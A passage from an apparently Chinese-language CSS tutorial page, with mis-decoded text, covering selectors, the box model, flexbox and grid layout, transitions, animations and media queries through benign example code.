css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å…ƒç´ é€‰æ‹©å™¨"><a href="#å…ƒç´ é€‰æ‹©å™¨" class="headerlink" title="å…ƒç´ é€‰æ‹©å™¨"></a>å…ƒç´ é€‰æ‹©å™¨</h4><p>å…ƒç´ é€‰æ‹©å™¨ç›´æ¥é€‰æ‹© HTML æ ‡ç­¾ä¸­çš„å…ƒç´ ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: black;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»¥ä¸Šä»£ç å°†æ‰€æœ‰ <code>&lt;p&gt;</code> å…ƒç´ çš„æ–‡æœ¬é¢œè‰²è®¾ä¸ºé»‘è‰²ã€‚</p><h4 id="ç±»é€‰æ‹©å™¨"><a href="#ç±»é€‰æ‹©å™¨" class="headerlink" title="ç±»é€‰æ‹©å™¨"></a>ç±»é€‰æ‹©å™¨</h4><p>ç±»é€‰æ‹©å™¨é€šè¿‡å…ƒç´ çš„ <code>class</code> å±æ€§æ¥é€‰æ‹©ç‰¹å®šçš„å…ƒç´ ï¼Œä½¿ç”¨ <code>.</code> ç¬¦å·ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.myclass</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTMLï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;myclass&quot;</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªå¸¦ç±»åçš„æ®µè½<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="ID-é€‰æ‹©å™¨"><a href="#ID-é€‰æ‹©å™¨" class="headerlink" title="ID é€‰æ‹©å™¨"></a>ID é€‰æ‹©å™¨</h4><p>ID é€‰æ‹©å™¨é€šè¿‡å…ƒç´ çš„ <code>id</code> å±æ€§é€‰æ‹©ï¼Œä½¿ç”¨ <code>#</code> ç¬¦å·ã€‚ID é€‰æ‹©å™¨çš„ä¼˜å…ˆçº§æ¯”ç±»é€‰æ‹©å™¨é«˜ï¼Œä½†åœ¨é¡µé¢ä¸­æ¯ä¸ª ID åªèƒ½ä½¿ç”¨ä¸€æ¬¡ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#header</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>&#125;<br></code></pre></td></tr></table></figure><p>HTMLï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;header&quot;</span>&gt;</span>è¿™æ˜¯ä¸€ä¸ªå¤´éƒ¨åŒºåŸŸ<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="å±æ€§é€‰æ‹©å™¨"><a href="#å±æ€§é€‰æ‹©å™¨" class="headerlink" title="å±æ€§é€‰æ‹©å™¨"></a>å±æ€§é€‰æ‹©å™¨</h4><p>å±æ€§é€‰æ‹©å™¨æ ¹æ® HTML å…ƒç´ çš„å±æ€§å€¼è¿›è¡Œé€‰æ‹©ã€‚è¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">input</span><span class="hljs-selector-attr">[type=<span class="hljs-string">&quot;text&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#000</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥é€‰æ‹©å™¨ä¼šä¸ºæ‰€æœ‰ <code>type=&quot;text&quot;</code> çš„ <code>input</code> å…ƒç´ åº”ç”¨æ ·å¼ã€‚</p><h4 id="ä¼ªç±»é€‰æ‹©å™¨"><a href="#ä¼ªç±»é€‰æ‹©å™¨" class="headerlink" title="ä¼ªç±»é€‰æ‹©å™¨"></a>ä¼ªç±»é€‰æ‹©å™¨</h4><p>ä¼ªç±»é€‰æ‹©å™¨ç”¨äºé€‰æ‹©å…ƒç´ çš„ç‰¹å®šçŠ¶æ€ï¼Œä¾‹å¦‚å½“å…ƒç´ è¢«æ‚¬åœã€ç‚¹å‡»æˆ–èšç„¦æ—¶ã€‚</p><ul><li>**<code>:hover</code>**ï¼šé¼ æ ‡æ‚¬åœæ—¶åº”ç”¨æ ·å¼ã€‚</li><li>**<code>:focus</code>**ï¼šå…ƒç´ è·å¾—ç„¦ç‚¹æ—¶åº”ç”¨æ ·å¼ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br><br><span class="hljs-selector-tag">input</span><span class="hljs-selector-pseudo">:focus</span> &#123;<br>    <span class="hljs-attribute">border-color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¼ªå…ƒç´ é€‰æ‹©å™¨"><a href="#ä¼ªå…ƒç´ é€‰æ‹©å™¨" class="headerlink" title="ä¼ªå…ƒç´ é€‰æ‹©å™¨"></a>ä¼ªå…ƒç´ é€‰æ‹©å™¨</h4><p>ä¼ªå…ƒç´ é€‰æ‹©å™¨ç”¨äºé€‰æ‹©å…ƒç´ çš„ä¸€éƒ¨åˆ†ï¼Œä¾‹å¦‚æ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—æ¯æˆ–è¡Œã€‚</p><ul><li>**<code>::before</code>**ï¼šåœ¨å…ƒç´ å†…å®¹ä¹‹å‰æ’å…¥å†…å®¹ã€‚</li><li>**<code>::after</code>**ï¼šåœ¨å…ƒç´ å†…å®¹ä¹‹åæ’å…¥å†…å®¹ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span><span class="hljs-selector-pseudo">::before</span> &#123;<br>    <span class="hljs-attribute">content</span>: <span class="hljs-string">&quot;ğŸŒŸ &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ä»£ç ä¼šåœ¨æ‰€æœ‰ <code>&lt;h1&gt;</code> å…ƒç´ å‰æ’å…¥ä¸€ä¸ªæ˜Ÿæ˜Ÿç¬¦å·ã€‚</p><hr><h3 id="CSS-ç›’æ¨¡å‹"><a href="#CSS-ç›’æ¨¡å‹" class="headerlink" title="CSS ç›’æ¨¡å‹"></a>CSS ç›’æ¨¡å‹</h3><h4 id="ç›’æ¨¡å‹ä»‹ç»"><a href="#ç›’æ¨¡å‹ä»‹ç»" class="headerlink" title="ç›’æ¨¡å‹ä»‹ç»"></a>ç›’æ¨¡å‹ä»‹ç»</h4><p>CSS ä¸­çš„æ¯ä¸ªå…ƒç´ éƒ½å¯ä»¥è¢«çœ‹ä½œä¸€ä¸ªç›’å­ï¼ŒCSS ç›’æ¨¡å‹æè¿°äº†ç›’å­çš„ç»„æˆéƒ¨åˆ†ã€‚ç›’æ¨¡å‹åŒ…å«ä»¥ä¸‹å››ä¸ªéƒ¨åˆ†ï¼š</p><ol><li><strong>å†…å®¹ï¼ˆContentï¼‰</strong>ï¼šæ˜¾ç¤ºæ–‡æœ¬æˆ–å›¾åƒçš„å®é™…åŒºåŸŸã€‚</li><li><strong>å¡«å……ï¼ˆPaddingï¼‰</strong>ï¼šå†…å®¹å‘¨å›´çš„ç©ºç™½åŒºåŸŸã€‚</li><li><strong>è¾¹æ¡†ï¼ˆBorderï¼‰</strong>ï¼šç¯ç»•å¡«å……å’Œå†…å®¹çš„è¾¹ç•Œã€‚</li><li><strong>è¾¹è·ï¼ˆMarginï¼‰</strong>ï¼šå…ƒç´ ä¸å…¶ä»–å…ƒç´ ä¹‹é—´çš„è·ç¦»ã€‚</li></ol><p>ç›’æ¨¡å‹å›¾è§£ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-code">+----------------------+</span><br><span class="hljs-section">|      Margin           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Border           |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Padding          |</span><br><span class="hljs-section">+----------------------+</span><br><span class="hljs-section">|      Content          |</span><br><span class="hljs-section">+----------------------+</span><br></code></pre></td></tr></table></figure><h4 id="è¾¹è·ï¼ˆMarginï¼‰"><a href="#è¾¹è·ï¼ˆMarginï¼‰" class="headerlink" title="è¾¹è·ï¼ˆMarginï¼‰"></a>è¾¹è·ï¼ˆMarginï¼‰</h4><p><code>margin</code> ç”¨äºè®¾ç½®å…ƒç´ ä¸å…¶ä»–å…ƒç´ ä¹‹é—´çš„å¤–éƒ¨é—´è·ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½ è¿˜å¯ä»¥åˆ†åˆ«ä¸ºä¸Šä¸‹å·¦å³è¾¹è·è®¾ç½®ä¸åŒçš„å€¼ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">margin-top</span>: <span class="hljs-number">10px</span>;<br>    <span class="hljs-attribute">margin-right</span>: <span class="hljs-number">15px</span>;<br>    <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;<br>    <span class="hljs-attribute">margin-left</span>: <span class="hljs-number">25px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="å¡«å……ï¼ˆPaddingï¼‰"><a href="#å¡«å……ï¼ˆPaddingï¼‰" class="headerlink" title="å¡«å……ï¼ˆPaddingï¼‰"></a>å¡«å……ï¼ˆPaddingï¼‰</h4><p><code>padding</code> ç”¨äºè®¾ç½®å†…å®¹ä¸è¾¹æ¡†ä¹‹é—´çš„å†…éƒ¨å¡«å……ç©ºé—´ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·å¯ä»¥åˆ†åˆ«è®¾ç½®å››ä¸ªæ–¹å‘çš„å¡«å……ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">15px</span> <span class="hljs-number">20px</span> <span class="hljs-number">25px</span>;  <span class="hljs-comment">/* ä¸Šï¼Œå³ï¼Œä¸‹ï¼Œå·¦ */</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è¾¹æ¡†ï¼ˆBorderï¼‰"><a href="#è¾¹æ¡†ï¼ˆBorderï¼‰" class="headerlink" title="è¾¹æ¡†ï¼ˆBorderï¼‰"></a>è¾¹æ¡†ï¼ˆBorderï¼‰</h4><p><code>border</code> ç”¨äºè®¾ç½®å…ƒç´ çš„è¾¹æ¡†ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>è¾¹æ¡†çš„åšåº¦ã€æ ·å¼å’Œé¢œè‰²å¯ä»¥é€šè¿‡ <code>border-width</code>, <code>border-style</code>, <code>border-color</code> è¿›è¡Œå•ç‹¬è®¾ç½®ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">border-width</span>: <span class="hljs-number">2px</span>;<br>    <span class="hljs-attribute">border-style</span>: dashed;<br>    <span class="hljs-attribute">border-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-å¸ƒå±€"><a href="#CSS-å¸ƒå±€" class="headerlink" title="CSS å¸ƒå±€"></a>CSS å¸ƒå±€</h3><h4 id="å—çº§å…ƒç´ ä¸è¡Œå†…å…ƒç´ "><a href="#å—çº§å…ƒç´ ä¸è¡Œå†…å…ƒç´ " class="headerlink" title="å—çº§å…ƒç´ ä¸è¡Œå†…å…ƒç´ "></a>å—çº§å…ƒç´ ä¸è¡Œå†…å…ƒç´ </h4><ul><li><strong>å—çº§å…ƒç´ </strong>ï¼ˆå¦‚ <code>&lt;div&gt;</code>, <code>&lt;p&gt;</code>ï¼‰ï¼šå æ®ä¸€æ•´è¡Œï¼Œå¤šä¸ªå—çº§å…ƒç´ ä¼šè‡ªåŠ¨æ¢è¡Œã€‚</li><li><strong>è¡Œå†…å…ƒç´ </strong>ï¼ˆå¦‚ <code>&lt;span&gt;</code>, <code>&lt;a&gt;</code>ï¼‰ï¼šåªå æ®å†…å®¹çš„å®½åº¦ï¼Œå¤šä¸ªè¡Œå†…å…ƒç´ ä¼šæ’åœ¨ä¸€è¡Œä¸­ã€‚</li></ul><h4 id="æµ®åŠ¨å¸ƒå±€ï¼ˆFloatï¼‰"><a href="#æµ®åŠ¨å¸ƒå±€ï¼ˆFloatï¼‰" class="headerlink" title="æµ®åŠ¨å¸ƒå±€ï¼ˆFloatï¼‰"></a>æµ®åŠ¨å¸ƒå±€ï¼ˆFloatï¼‰</h4><p><code>float</code> å±æ€§ç”¨äºè®©å…ƒç´ å·¦å³æµ®åŠ¨ï¼Œä»è€Œå®ç°ç®€å•çš„å¸ƒå±€ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">200px</span>;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">10px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>å¤šä¸ªæµ®åŠ¨å…ƒç´ å¯ä»¥å·¦å³æ’åˆ—ï¼Œæµ®åŠ¨å¸ƒå±€å¸¸ç”¨äºå›¾ç‰‡æ’ç‰ˆå’Œç®€å•çš„åˆ—å¸ƒå±€ã€‚</p><h4 id="å¼¹æ€§ç›’æ¨¡å‹ï¼ˆFlexboxï¼‰"><a href="#å¼¹æ€§ç›’æ¨¡å‹ï¼ˆFlexboxï¼‰" class="headerlink" title="å¼¹æ€§ç›’æ¨¡å‹ï¼ˆFlexboxï¼‰"></a>å¼¹æ€§ç›’æ¨¡å‹ï¼ˆFlexboxï¼‰</h4><p>&#96;flexbox</p><p>&#96; æ˜¯ç°ä»£å¸ƒå±€çš„å¼ºå¤§å·¥å…·ï¼Œç”¨äºåˆ›å»ºçµæ´»çš„å“åº”å¼å¸ƒå±€ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: flex;<br>    <span class="hljs-attribute">justify-content</span>: space-between; <span class="hljs-comment">/* ä¸»è½´å¯¹é½æ–¹å¼ */</span><br>    <span class="hljs-attribute">align-items</span>: center;  <span class="hljs-comment">/* äº¤å‰è½´å¯¹é½æ–¹å¼ */</span><br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>display: flex</code> å°†å®¹å™¨è®¾ä¸ºå¼¹æ€§ç›’å®¹å™¨ã€‚</li><li><code>justify-content</code> å’Œ <code>align-items</code> æ§åˆ¶å­å…ƒç´ åœ¨ä¸»è½´å’Œäº¤å‰è½´ä¸Šçš„å¯¹é½æ–¹å¼ã€‚</li></ul><h4 id="ç½‘æ ¼å¸ƒå±€ï¼ˆGridï¼‰"><a href="#ç½‘æ ¼å¸ƒå±€ï¼ˆGridï¼‰" class="headerlink" title="ç½‘æ ¼å¸ƒå±€ï¼ˆGridï¼‰"></a>ç½‘æ ¼å¸ƒå±€ï¼ˆGridï¼‰</h4><p><code>grid</code> æ˜¯å¦ä¸€ä¸ªç”¨äºå¤æ‚å¸ƒå±€çš„ CSS å·¥å…·ï¼Œå…è®¸ä½ åˆ›å»ºäºŒç»´çš„ç½‘æ ¼å¸ƒå±€ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">display</span>: grid;<br>    <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;  <span class="hljs-comment">/* åˆ›å»ºä¸‰åˆ—ç­‰å®½å¸ƒå±€ */</span><br>    <span class="hljs-attribute">gap</span>: <span class="hljs-number">10px</span>;  <span class="hljs-comment">/* è®¾ç½®ç½‘æ ¼é—´è· */</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>grid-template-columns</code> å®šä¹‰åˆ—çš„å¸ƒå±€ï¼Œ<code>gap</code> å®šä¹‰ç½‘æ ¼é¡¹ä¹‹é—´çš„é—´è·ã€‚</p><hr><h3 id="å¸¸è§-CSS-å±æ€§"><a href="#å¸¸è§-CSS-å±æ€§" class="headerlink" title="å¸¸è§ CSS å±æ€§"></a>å¸¸è§ CSS å±æ€§</h3><h4 id="æ–‡æœ¬æ ·å¼"><a href="#æ–‡æœ¬æ ·å¼" class="headerlink" title="æ–‡æœ¬æ ·å¼"></a>æ–‡æœ¬æ ·å¼</h4><ul><li>**<code>color</code>**ï¼šè®¾ç½®æ–‡æœ¬é¢œè‰²ã€‚</li><li>**<code>font-size</code>**ï¼šè®¾ç½®å­—ä½“å¤§å°ã€‚</li><li>**<code>font-family</code>**ï¼šè®¾ç½®å­—ä½“ã€‚</li><li>**<code>text-align</code>**ï¼šè®¾ç½®æ–‡æœ¬å¯¹é½æ–¹å¼ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>    <span class="hljs-attribute">font-family</span>: Arial, sans-serif;<br>    <span class="hljs-attribute">text-align</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="èƒŒæ™¯æ ·å¼"><a href="#èƒŒæ™¯æ ·å¼" class="headerlink" title="èƒŒæ™¯æ ·å¼"></a>èƒŒæ™¯æ ·å¼</h4><ul><li>**<code>background-color</code>**ï¼šè®¾ç½®å…ƒç´ çš„èƒŒæ™¯é¢œè‰²ã€‚</li><li>**<code>background-image</code>**ï¼šè®¾ç½®èƒŒæ™¯å›¾ç‰‡ã€‚</li><li>**<code>background-position</code>**ï¼šè®¾ç½®èƒŒæ™¯å›¾ç‰‡çš„ä½ç½®ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">body</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: lightgrey;<br>    <span class="hljs-attribute">background-image</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;background.jpg&#x27;</span>);<br>    <span class="hljs-attribute">background-position</span>: center;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ˜¾ç¤ºä¸å¯è§æ€§"><a href="#æ˜¾ç¤ºä¸å¯è§æ€§" class="headerlink" title="æ˜¾ç¤ºä¸å¯è§æ€§"></a>æ˜¾ç¤ºä¸å¯è§æ€§</h4><ul><li>**<code>display</code>**ï¼šæ§åˆ¶å…ƒç´ çš„æ˜¾ç¤ºæ–¹å¼ã€‚<ul><li><code>display: block</code>ï¼šè®¾ç½®å…ƒç´ ä¸ºå—çº§å…ƒç´ ã€‚</li><li><code>display: inline</code>ï¼šè®¾ç½®å…ƒç´ ä¸ºè¡Œå†…å…ƒç´ ã€‚</li><li><code>display: none</code>ï¼šéšè—å…ƒç´ ï¼Œä¸å æ®ç©ºé—´ã€‚</li></ul></li><li>**<code>visibility</code>**ï¼šè®¾ç½®å…ƒç´ çš„å¯è§æ€§ã€‚<ul><li><code>visibility: hidden</code>ï¼šéšè—å…ƒç´ ï¼Œä½†ä¿ç•™ç©ºé—´ã€‚</li></ul></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">display</span>: none;<br>&#125;<br><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">visibility</span>: hidden;<br>&#125;<br></code></pre></td></tr></table></figure><hr><h3 id="CSS-åŠ¨ç”»ä¸è¿‡æ¸¡"><a href="#CSS-åŠ¨ç”»ä¸è¿‡æ¸¡" class="headerlink" title="CSS åŠ¨ç”»ä¸è¿‡æ¸¡"></a>CSS åŠ¨ç”»ä¸è¿‡æ¸¡</h3><p>CSS æä¾›äº†ç®€å•çš„æ–¹å¼æ¥åˆ›å»ºåŠ¨ç”»æ•ˆæœå’Œè¿‡æ¸¡æ•ˆæœã€‚</p><ul><li><strong>è¿‡æ¸¡</strong>ï¼ˆTransitionï¼‰ï¼šå…ƒç´ å±æ€§åœ¨ä¸€æ®µæ—¶é—´å†…å¹³æ»‘å˜åŒ–ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">button</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: blue;<br>    <span class="hljs-attribute">transition</span>: background-color <span class="hljs-number">0.5s</span>;  <span class="hljs-comment">/* è¿‡æ¸¡æ—¶é—´ 0.5 ç§’ */</span><br>&#125;<br><br><span class="hljs-selector-tag">button</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“é¼ æ ‡æ‚¬åœæ—¶ï¼ŒæŒ‰é’®èƒŒæ™¯é¢œè‰²ä¼šåœ¨ 0.5 ç§’å†…å¹³æ»‘è¿‡æ¸¡åˆ°çº¢è‰²ã€‚</p><ul><li><strong>åŠ¨ç”»</strong>ï¼šå®šä¹‰å…³é”®å¸§åŠ¨ç”»ã€‚</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> example &#123;<br>    <span class="hljs-selector-tag">from</span> &#123;<span class="hljs-attribute">background-color</span>: red;&#125;<br>    <span class="hljs-selector-tag">to</span> &#123;<span class="hljs-attribute">background-color</span>: yellow;&#125;<br>&#125;<br><br><span class="hljs-selector-tag">div</span> &#123;<br>    <span class="hljs-attribute">animation</span>: example <span class="hljs-number">2s</span> infinite;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥åŠ¨ç”»ä¼šè®©èƒŒæ™¯é¢œè‰²ä»çº¢è‰²é€æ¸å˜ä¸ºé»„è‰²ï¼Œå¹¶æŒç»­é‡å¤ã€‚</p><hr><h3 id="å“åº”å¼è®¾è®¡"><a href="#å“åº”å¼è®¾è®¡" class="headerlink" title="å“åº”å¼è®¾è®¡"></a>å“åº”å¼è®¾è®¡</h3><p>å“åº”å¼è®¾è®¡è®©ç½‘é¡µèƒ½å¤Ÿé€‚é…ä¸åŒè®¾å¤‡çš„å±å¹•å°ºå¯¸ï¼Œå¦‚æ‰‹æœºã€å¹³æ¿ã€æ¡Œé¢æ˜¾ç¤ºå™¨ã€‚</p><h4 id="åª’ä½“æŸ¥è¯¢"><a href="#åª’ä½“æŸ¥è¯¢" class="headerlink" title="åª’ä½“æŸ¥è¯¢"></a>åª’ä½“æŸ¥è¯¢</h4><p>åª’ä½“æŸ¥è¯¢å¯ä»¥æ ¹æ®è®¾å¤‡çš„å±å¹•å¤§å°ï¼Œåº”ç”¨ä¸åŒçš„æ ·å¼ã€‚</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">600px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">background-color</span>: lightblue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“å±å¹•å®½åº¦å°äº 600 åƒç´ æ—¶ï¼ŒèƒŒæ™¯é¢œè‰²ä¼šå˜æˆæµ…è“è‰²ã€‚</p><hr><h3 id="CSS-ä¼˜åŒ–æŠ€å·§"><a href="#CSS-ä¼˜åŒ–æŠ€å·§" class="headerlink" title="CSS ä¼˜åŒ–æŠ€å·§"></a>CSS ä¼˜åŒ–æŠ€å·§</h3><ol><li><strong>åˆå¹¶æ ·å¼</strong>ï¼šå°†ç›¸ä¼¼çš„æ ·å¼åˆå¹¶ï¼Œå‡å°‘é‡å¤ä»£ç ã€‚</li><li><strong>å‡å°‘åµŒå¥—</strong>ï¼šå°½é‡å‡å°‘é€‰æ‹©å™¨åµŒå¥—çš„å±‚æ¬¡ï¼Œä»¥æé«˜å¯è¯»æ€§å’Œæ€§èƒ½ã€‚</li><li><strong>ä½¿ç”¨ç±»é€‰æ‹©å™¨</strong>ï¼šé¿å…è¿‡åº¦ä¾èµ– ID é€‰æ‹©å™¨ï¼Œç±»é€‰æ‹©å™¨çš„å¤ç”¨æ€§æ›´å¼ºã€‚</li><li><strong>ä½¿ç”¨å¤–éƒ¨æ ·å¼è¡¨</strong>ï¼šå°† CSS æ”¾åœ¨å¤–éƒ¨æ–‡ä»¶ä¸­ï¼Œå‡å°‘ HTML æ–‡ä»¶çš„å¤§å°ã€‚</li></ol><hr><h1 id="JavaScript-è¯¦å°½å…¥é—¨ä¸æŒ‡å—"><a href="#JavaScript-è¯¦å°½å…¥é—¨ä¸æŒ‡å—" class="headerlink" title="JavaScript è¯¦å°½å…¥é—¨ä¸æŒ‡å—"></a>JavaScript 